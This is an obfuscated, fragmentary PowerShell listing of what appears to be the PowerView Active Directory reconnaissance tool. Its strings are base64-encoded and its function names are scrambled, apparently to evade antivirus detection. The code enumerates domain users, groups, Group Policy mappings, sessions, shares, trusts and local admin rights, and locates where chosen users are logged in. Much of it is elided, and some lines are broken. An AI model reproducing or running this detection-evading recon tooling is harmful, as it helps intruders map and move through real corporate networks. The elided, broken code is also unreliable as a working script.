function Add-DomainGroupMember {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $GroupContext = _/=\/=\_/\_____/\/ @ContextArguments
        if ($GroupContext) {
            try {
        ...
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                    ...
                    $UserContext = _/=\/=\_/\_____/\/ @ContextArguments
                    if ($UserContext) {
    ...
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in $Domain) {
                ...
                $UserSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {____/\/\__/=\_/=\_($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if ($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {____/\/\__/=\_/=\_($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if ($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {____/\/\__/=\_/=\_($UserResult.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | Sort-Object -Unique
            }
        }
        else {
            $UserSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
...
function Get-DomainDFSShare {
    ...
    BEGIN {
        ...
        function _/==\/======\_/\/\ {
            ...
            $DFSsearcher = ____/==\/\_/\_/=\_ @PSBoundParameters
            if ($DFSsearcher) {
                $DFSshares = @()
...
function __/\____/\__/\/\/= {
        ...
        try {
            if (($GptTmplPath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ...
                if (-not $MappedPaths[$SysVolPath]) {
                    _/=\____/\/=\_/=\/ -Path $SysVolPath -Credential $Credential
            ...
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                $Contents = ___/===\_/===\/=== -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                if ($Contents) {
                ...
                $Contents = ___/===\_/===\/=== -Path $TargetGptTmplPath -ErrorAction Stop
                if ($Contents) {
    ...
    END {
        $MappedPaths.Keys | ForEach-Object { _/==\___/\__/==\__ -Path $_ }
    }
}
function _/=\/==\/\_/==\_/= {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            ...
            $GroupsXMLcontent | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAEcAcgBvAHUAcAA='))) | Select-Object -ExpandProperty node | ForEach-Object {
                ...
                if (-not $GroupSID) {
                    ...
                    elseif ($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                        ...
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            $GroupSID = __/===\_/===\/=\/= -ObjectName $Groupname -Credential $Credential
                        }
                        else {
                            $GroupSID = __/===\_/===\/=\/= -ObjectName $Groupname
                        }
                    }
                }
...
function ___/\/=\_/=\/\_/=\ {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $GPOSearcher = ____/==\/\_/\_/=\_ @SearcherArguments
    }
    PROCESS {
        if ($GPOSearcher) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) {
                ...
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
                    ...
                    $Computer = ___/=\_/\___/=\/\_ @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $Computer) {
                    ...
                    $User = __/\/\/=\_/======\ @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                ...
                if ($ObjectOUs) {
                    ...
                    ForEach($ObjectOU in $ObjectOUs) {
                        ...
                        $GPOAdsPaths += _/==\__/=\/====\/\ @SearcherArguments | ForEach-Object {
                            if ($_.gplink) {
                ...
                if ($TargetComputerName) {
                    $ComputerSite = (___/====\/\__/==== -ComputerName $TargetComputerName).SiteName
                    if($ComputerSite -and ($ComputerSite -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACoA'))))) {
                        ...
                        $GPOAdsPaths += _/=\/=\___/\/==\_/ @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                        $_.split(';')[0]
                ...
                $GPOAdsPaths += _/==\/=\_____/==== @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                $_.split(';')[0]
                ...
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ...
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] -and ($SearchBase -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A'))))) {
                            $GPO = __/\_/\/\__/\_/\/= -Properties $_.Properties
                            try {
...
function ____/\__/\/=\/\/\_ {
    ...
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        ___/\/=\_/=\/\_/=\ @SearcherArguments | ForEach-Object {
                        ...
                        ForEach ($Member in $MembershipValue) {
                            if ($Member -and ($Member.Trim() -ne '')) {
                                if ($Member -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                    ...
                                    $MemberSID = __/===\_/===\/=\/= @ConvertToArguments
                                    if ($MemberSID) {
                ...
                ForEach ($Membership in $Memberships.GetEnumerator()) {
                    if ($Membership -and $Membership.Key -and ($Membership.Key -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcACoA'))))) {
                        ...
                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
                            $GroupName = ________/=\_/==\__ -ObjectSID $GroupSID @ConvertArguments
                        }
                        else {
                            $GroupName = $False
                        }
                        ...
                        if ($GroupName -and ($GroupName.Trim() -ne '')) {
                            ...
                            elseif ($GroupName.Trim() -ne '') {
                                ...
                                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ConvertToArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                $GroupSID = __/===\_/===\/=\/= @ConvertToArguments
                            }
                            else {
                                $GroupSID = $Null
                            }
            ...
            _/=\/==\/\_/==\_/= @ParseArgs | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
                    $GroupMembers = @()
                    ForEach ($Member in $_.GroupMembers) {
                        if ($Member -and ($Member.Trim() -ne '')) {
                            if ($Member -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ConvertToArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                $MemberSID = __/===\_/===\/=\/= -Domain $Domain -ObjectName $Member
                                if ($MemberSID) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
...
function Get-DomainGPOUserLocalGroupMapping {
    ...
    PROCESS {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) {
            $TargetSIDs += _/==\/=\_____/==== @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
        ...
        if ($TargetSIDs[0] -ne '*') {
            ForEach ($TargetSid in $TargetSids) {
                ...
                $TargetSIDs += ____/\/\___/\/==== @CommonArguments -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))) -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
            }
        }
        ...
        $GPOgroups = ____/\__/\/=\/\/\_ @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
            $GPOgroup = $_
        ...
        $GPOgroups | Where-Object {$_} | ForEach-Object {
            ...
            _/==\__/=\/====\/\ @CommonArguments -Raw -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQA='))) -GPLink $GPOGuid | ForEach-Object {
                if ($Filters) {
                    $OUComputers = ___/=\_/\___/=\/\_ @CommonArguments -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $OUComputers = ___/=\_/\___/=\/\_ @CommonArguments -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))) -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                }
                if ($OUComputers) {
                    if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}
                    ForEach ($TargetSid in $TargetObjectSIDs) {
                        $Object = _/==\/=\_____/==== @CommonArguments -Identity $TargetSid -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
            ...
            _/=\/=\___/\/==\_/ @CommonArguments -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAHQAZQBvAGIAagBlAGMAdABiAGwALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUA'))) -GPLink $GPOGuid | ForEach-Object {
                ForEach ($TargetSid in $TargetObjectSIDs) {
                    $Object = _/==\/=\_____/==== @CommonArguments -Identity $TargetSid -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
                    $IsGroup = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                    $GPOLocalGroupMapping = New-Object PSObject
...
function Get-DomainGPOComputerLocalGroupMapping {
    ...
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
            $Computers = ___/=\_/\___/=\/\_ @CommonArguments -Identity $ComputerIdentity -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
            if (-not $Computers) {
            ...
            ForEach ($Computer in $Computers) {
                ...
                if ($OUName) {
                    $GPOGuids += _/==\__/=\/====\/\ @CommonArguments -SearchBase $OUName -LDAPFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAKQA='))) | ForEach-Object {
                ...
                $ComputerSite = (___/====\/\__/==== -ComputerName $Computer.dnshostname).SiteName
                if ($ComputerSite -and ($ComputerSite -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))))) {
                    $GPOGuids += _/=\/=\___/\/==\_/ @CommonArguments -Identity $ComputerSite -LDAPFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAKQA='))) | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(''))) -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                $GPOGuids | ____/\__/\/=\/\/\_ @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $GPOGroup = $_
                    ...
                    $GPOMembers | ForEach-Object {
                        $Object = _/==\/=\_____/==== @CommonArguments -Identity $_
                        $IsGroup = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
...
function Get-DomainPolicyData {
    ...
    PROCESS {
        ...
        $GPOResults = ___/\/=\_/=\/\_/=\ @SearcherArguments
        ForEach ($GPO in $GPOResults) {
            ...
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ParseArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            __/\____/\__/\/\/= @ParseArgs | ForEach-Object {
        ...
        ForEach ($Computer in $ComputerName) {
            try {
                ...
                $Reg.GetSubKeyNames() | Where-Object { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) } | ForEach-Object {
                    $UserName = ________/=\_/==\__ -ObjectSID $_ -OutputType $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))
                    if ($UserName) {
    ...
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Computer -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAD8AOgBbADAALQA5AF0AewAxACwAMwB9AFwALgApAHsAMwB9AFsAMAAtADkAXQB7ADEALAAzAH0AJAA=')))) {
                ...
                $IPAddress = @(_/======\/=\/\/\__ -ComputerName $Computer)[0].IPAddress
            }
            $PtrInfo = [IntPtr]::Zero
        ...
        ForEach ($Computer in $ComputerName) {
            ...
            try {
                ...
                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            $UserName = ________/=\_/==\__ -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ________/=\_/==\__ -ObjectSid $UserSID
                        }
    ...
    PROCESS {
        ForEach ($TargetPath in $Path) {
            ...
            Get-ChildItem @SearcherArguments | ForEach-Object {
                ...
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] -and (-not (_/==\__/==\/==\/\/ -Path $_.FullName))) {
                    $Continue = $False
                }
                if ($Continue) {
                    $FileParams = @{
...
function Find-DomainUserLocation {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ...
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAYQBsAHQAaAA=')))]) {
                ...
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQB8AEEAbABsAA==')))) {
                    ...
                    $FileServers = __/\____/==\/\/==\ @FileServerSearcherArguments
                ...
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAHwAQQBsAGwA')))) {
                    ...
                    $DomainControllers = _____/\/\/===\/=\_ @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                ...
                $TargetComputers = ___/=\_/\___/=\/\_ @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        ...
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
            $TargetUsers = __/\/\/=\_/======\ @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            ...
            $TargetUsers = _/==\_/\_/\_/=\___ @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        ...
        $HostEnumBlock = {
            ...
            if ($TokenHandle) {
                $Null = __/=\/=\_/\/=====\ -TokenHandle $TokenHandle -Quiet
            }
            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Sessions = ____/=\_/\_/\_/\__ -ComputerName $TargetComputer
                    ForEach ($Session in $Sessions) {
                        ...
                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkACQA'))))) {
                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
                                ...
                                if ($CheckAccess) {
                                    $Admin = (_____/=\/\/==\/=== -ComputerName $CName).IsAdmin
                    ...
                    if (-not $Stealth) {
                        $LoggedOn = __/\_/\___/\/====\ -ComputerName $TargetComputer
                        ForEach ($User in $LoggedOn) {
                            ...
                            if (($UserName) -and ($UserName.trim() -ne '')) {
                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkACQA'))))) {
                                    $IPAddress = @(_/======\/=\/\/\__ -ComputerName $TargetComputer)[0].IPAddress
                                    $UserLocation = New-Object PSObject
                                    ...
                                    $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                    if ($CheckAccess) {
                                        $Admin = _____/=\/\/==\/=== -ComputerName $TargetComputer
                                        $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Admin.IsAdmin
                                    }
                                    else {
                                        $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ...
                $LogonToken = __/=\/=\_/\/=====\ -Credential $Credential -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            ...
            __/=\/\/\__/=\/\/\ -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
    END {
        if ($LogonToken) {
    ...
    BEGIN {
        ...
        $HostEnumBlock = {
            ...
            ForEach ($TargetComputer in $ComputerName) {
                ...
                if ($Up) {
                    if ($Credential) {
                        $Processes = ___/\__/=\/=\_/=\/ -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    else {
                        $Processes = ___/\__/=\/=\_/=\/ -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
...
function Find-DomainUserEvent {
    ...
    BEGIN {
        ...
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ...
            $TargetComputers = _____/\/\/===\/=\_ @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
            ...
            ForEach ($TargetComputer in $ComputerName) {
                ...
                if ($Up) {
                    ...
                    if ($Filter -or $TargetUsers) {
                        if ($TargetUsers) {
                            _/===\__/=======\/ @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
                        }
                        else {
                            $Operator = 'or'
                            ...
                            _/===\__/=======\/ @DomainUserEventArgs | ForEach-Object {
                                if ($Operator -eq 'or') {
                                    ForEach ($Key in $Keys) {
    ...
    BEGIN {
        ...
        $HostEnumBlock = {
            ...
            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Shares = _/========\/=\_/=\ -ComputerName $TargetComputer
    ...
    BEGIN {
        ...
        $HostEnumBlock = {
            ...
            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Access = _____/=\/\/==\/=== -ComputerName $TargetComputer
                    if ($Access.IsAdmin) {
                        $TargetComputer
                    }
                }
        ...
        $HostEnumBlock = {
            ...
            ForEach ($TargetComputer in $ComputerName) {
                ...
                if ($Up) {
                    ...
                    __/\/=\/\/\_/\/\_/ @NetLocalGroupMemberArguments
                }
            }
            if ($TokenHandle) {
                _/===\/\/=\/=\_/==
    ...
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
            ...
            if ($Domain -and $Domain.Trim() -ne '') {
                ...
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                    $SourceDomain = (__/==\/\_/\/\__/\_ -Credential $Credential).Name
                }
                else {
                    $SourceDomain = (__/==\/\_/\/\__/\_).Name
                }
            }
        }
        ...
        if ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA=')))) {
            $TrustSearcher = ____/==\/\_/\_/=\_ @LdapSearcherArguments
            $SourceSID = ___/====\/\_/=\/== @NetSearcherArguments
            if ($TrustSearcher) {
        ...
        elseif ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
            ...
            $FoundDomain = __/==\/\_/\/\__/\_ @NetSearcherArguments
            if ($FoundDomain) {
...
function __/===\/\_/=\_/\/\ {
    ...
    PROCESS {
        ...
        $FoundForest = ___/==\__/\_/=\_/\ @NetForestArguments
        if ($FoundForest) {
...
function Get-DomainForeignUser {
    ...
    PROCESS {
        __/\/\/=\_/======\ @SearcherArguments  | ForEach-Object {
...
function Get-DomainForeignGroupMember {
    ...
    PROCESS {
        ...
        ____/\/\___/\/==== @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
...
function Get-DomainTrustMapping {
    ...
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
        $CurrentDomain = (__/==\/\_/\/\__/\_ -Credential $Credential).Name
    }
    else {
        $CurrentDomain = (__/==\/\_/\/\__/\_).Name
    }
    ...
    while($Domains.Count -ne 0) {
        ...
        if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {
            ...
            try {
                ...
                $Trusts = ____/==\/\/=\____/ @DomainTrustArguments
                ...
                if ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))) {
                    ...
                    $Trusts += __/===\/\_/=\_/\/\ @ForestTrustArguments
                }
                if ($Trusts) {
                    if ($Trusts -isnot [System.Array]) {
                        $Trusts = @($Trusts)
...
$Mod = __/\__/\/=\___/=\/ -ModuleName Win32
$SamAccountTypeEnum = _/=\/\_/===\/=\_/= $Mod PowerView.SamAccountTypeEnum UInt32 @{
...
$GroupTypeEnum = _/=\/\_/===\/=\_/= $Mod PowerView.GroupTypeEnum UInt32 @{
...
$UACEnum = _/=\/\_/===\/=\_/= $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
...
$WTSConnectState = _/=\/\_/===\/=\_/= $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
...
$WTS_SESSION_INFO_1 = _/==\/=\/\/===\_/\ $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = ___/=====\/\/\/\/\ 0 UInt32
